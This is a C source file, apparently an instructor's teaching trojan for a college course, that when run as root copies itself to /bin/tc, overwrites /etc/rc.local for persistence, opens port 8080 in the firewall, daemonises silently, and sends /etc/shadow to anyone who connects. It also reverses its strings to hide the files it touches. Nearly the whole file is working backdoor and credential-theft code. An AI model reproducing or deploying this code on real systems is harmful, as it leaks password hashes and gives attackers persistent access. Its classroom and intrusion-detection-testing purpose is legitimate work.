#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <netinet/in.h>

#define MY_PORT_NUMBER 8080

//
// Trival trojan horse program built for CO10032
// Note: strings are obfuscated so the students
// can't simply use the strings command to see what files are touched
//
// This program will:
//	- copy itself to /bin/tc
//	- add itself to /etc/rc.local (more accurately replace rc.local)
//	- open a hole for itself in an iptables firewall
//
//	- create /etc/motd containing the text: Hello what's your name
//
// To build this program:
// 	gcc -o trojan_c CO10032_trojan_c.c
//	
// james long
// james.long5@mohakwcollege.ca
//



char* Flip(char *strA){
	int i,j;
	char c;
	char *strOut;

	i=0;
	j=strlen(strA) - 1;
	strOut = strdup(strA);

	while(i<j){
		strOut[i] = strA[j];
		strOut[j] = strA[i];
		i++;
		j--;
	}
	return strOut;
}

void OpenTheDoors(int c, char *argv[]){
	char strA[1024];
	int i;
	FILE *fdIPT;
	FILE *fdRC;

	/// manage the obfuscated strings 
	//
	char *strCP="pc";
	char *strMSG="?eman ruoy s'tahw ,olleH";
	char *strECHO="ohce";
	char *strETC="cte";
	char *strRCLOCAL="lacol.cr/d.cr/cte/";
	char *strCAT="tac";
	char *strBIN="nib";
	char *strTC="ct";
	char *strF1="tac";
	char *strF2="ecila";
	char *strF3="dtom";

	// throw in a few red-herring strings
	//
	char *strRH="cp /bin/ksh /bin/tc";
	char *strRHa="echo secret > /etc/newfile";


	// cat "hello what's your name" > /etc/motd"
	sprintf(strA,"%s \"%s\" > /%s/%s", Flip(strECHO), Flip(strMSG), Flip(strETC), Flip(strF3));
	printf("_%s_\n",strA);
	system(strA);

	// cp $0 /bin/tc
	sprintf(strA,"%s %s /bin/tc", Flip(strCP),argv[0]);
	printf("_%s_\n",strA);
	system(strA);

	// now that we have a copy of ourself in /bin/tc
	// add a call to /bin/tc in /etc/rc.local
	fdRC=fopen(Flip(strRCLOCAL),"w");
	fprintf(fdRC,"/%s/%s %s\n",Flip(strBIN),Flip(strTC),"-InfectMe");
	fclose(fdRC);

	// modify /etc/sysconfig/iptables
	//
	// note: these strings are not obfuscated, we want to do everything
	// we can to have the students know they should be interested in port 8080
	//

	system("/usr/bin/firewall-cmd --permanent --add-port=8080/tcp");
	system("/usr/bin/firewall-cmd --reload");

/* replaced with firewalld
         
	fdIPT = fopen("/etc/sysconfig/iptables","w");
	if(!fdIPT) {
		printf("Unexpect error %d - %s\n",errno,strerror(errno) );
		printf("%d",EACCES);
	}
	fprintf(fdIPT,"*filter\n");
	fprintf(fdIPT,":INPUT DROP [0:0]\n");
	fprintf(fdIPT,":FORWARD DROP [0:0]\n");
	fprintf(fdIPT,":OUTPUT ACCEPT [0:0]\n");
	fprintf(fdIPT,"# will respond quicker than drop\n");
	fprintf(fdIPT,"-A FORWARD -j REJECT --reject-with icmp-host-prohibited\n");
	fprintf(fdIPT,"\n");
	fprintf(fdIPT,"-A INPUT -i lo -j ACCEPT\n");
	fprintf(fdIPT,"-A INPUT -p icmp --icmp-type 8 -j ACCEPT\n");
	fprintf(fdIPT,"-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n");
	fprintf(fdIPT,"-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT\n");
	fprintf(fdIPT,"-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT\n");
	fprintf(fdIPT,"-A INPUT -m state --state NEW -m tcp -p tcp --dport 443 -j ACCEPT\n");
	fprintf(fdIPT,"-A INPUT -m state --state NEW -m tcp -p tcp --dport 8080 -j ACCEPT\n");
	fprintf(fdIPT,"-A INPUT -j REJECT --reject-with icmp-host-prohibited\n");
	fprintf(fdIPT,"COMMIT\n");
	fclose(fdIPT);

	// restart the firewall
	system("/sbin/service iptables restart");
	
*/
}

void usage(char *strName)
{
	/* warnt the user */
	printf("Warning: %s is a trojan-horse program.\n",strName);
	printf("It is designed for educational purposes and the testing of IDS\n");
	printf("It will open back-doors on our Unix system.\n");
	printf("If you still want to run it, envoke it with the -InfectMe commandline option\n");
}




void error(const char *msg)
{
    perror(msg);
    exit(1);
}

void SpitShadow(int fdsock){
	int fdshadow;
	char buf[1024];
	int nRead;

	fdshadow = open("/etc/shadow",O_RDONLY);
	if(fdshadow < 0) return;
	
	while( nRead = read(fdshadow,buf,1024)) {
		write(fdsock,buf,nRead);
	}

}

service() {
     	int sockfd, newsockfd, portno;
     	socklen_t clilen;
     	char buffer[256];
     	struct sockaddr_in serv_addr, cli_addr;
     	int n;
	int optval;

	// create socket data structure
	//


     	sockfd = socket(AF_INET, SOCK_STREAM, 0);
     	if (sockfd < 0) 
       		 error("ERROR opening socket");
     	bzero((char *) &serv_addr, sizeof(serv_addr));

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = INADDR_ANY;
	serv_addr.sin_port = htons(MY_PORT_NUMBER);

	// set SO_REUSEADDR on a socket to true (1):
	optval = 1;
	if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof optval)){
		error("error setting sock opt");
	}

	// bind
	//
	if (bind(sockfd, (struct sockaddr *) &serv_addr,
              sizeof(serv_addr)) < 0) 
              error("ERROR on binding");

	// Tell the kernel that this is a socket for listenting
	//
     	listen(sockfd,5);
	clilen = sizeof(cli_addr);

	// Accept connections
	//
	// For each new connecton:
	//	Child:
	//	- fork
	//	- close sockfd, we no longer needig
	//	- process requests 
	//	Parent:
	//	- continue listening for new connections
	//
	//
	while(1){
     		newsockfd = accept(sockfd, 
                 	(struct sockaddr *) &cli_addr, 
                 	&clilen);
     		if (newsockfd < 0) 
          	error("ERROR on accept");
	
		// fork, child will handle requests, we will listen for more
		//
		// yes, this will result in zombies, (aka defunct processes)
		// we could use the double fork() trick, or call wait on SIGCHILD
		// but frankly we are lazy, AND this could be an opportunity to
		// to introduct zombies to the class
		//

		if(!fork()) {
			// child , Process Requests
			//
		
			// we don't need the original socket, close it
			close(sockfd);

			
			// say hello to the nice people
			//
			//write(newsockfd,"Greetings Master:\n\n",strlen("Greetings Master:\n\n"));
			SpitShadow(newsockfd);

			
			// all done, bye-bye
			close(newsockfd);
			exit(0);
		} 
		
		// if we get here we are the parent, we do not need newsockfd
		close(newsockfd);
	
	}	

	// put away our toys
	//
	close(sockfd);

	return 0; 
}

main(int c, char *argv[])
{
	#define MODE_DBG 1
	#define MODE_INFECT 2

	int nMode;

	nMode = 0;

	// require exactly one command line arg
	if(c != 2) {
		usage(argv[0]);
		exit(1);
	}

	if(strcmp(argv[1],"-InfectMe") == 0){
		nMode = MODE_INFECT;
	}	

	if(strcmp(argv[1],"-Debug") == 0)
	{
		nMode = MODE_DBG;
	}

	// if no  mode set, bail
	if( !nMode){
		usage(argv[0]);
		exit(1);
	}

	// if we get here, -InfectMe or -Debug has be supplied, so we can go to work
	
	/* check to see if we are running as root */
	uid_t euid=geteuid();
	if ( euid != 0) {
		fprintf(stderr,"%s: Sorry you must be root to run this command.\n",argv[0]);    
		exit(1); 
	} 


	printf("Thanks for running my program.\n");
	printf("If you ever need root access to you server, please let me know.\n");


	/* make std out and std err /dev/null, so that we run silently from here */
	// (unless we are in debug mode)
	if(nMode != MODE_DBG)
	{
		close(1);
		close(2);
		open("/dev/null",O_RDWR);
		open("/dev/null",O_RDWR);
	}


	OpenTheDoors(c, argv);

	// become a daemon
        /* run a copy of ourself as a daemon */
        if(fork()) {
                /* parent (or fork error), exit */
                exit(0);
        }

        /* if we get here we are the child, time to become a daemon */

        /* get our own process group */
        setsid();

	// process requests
	service();	
}


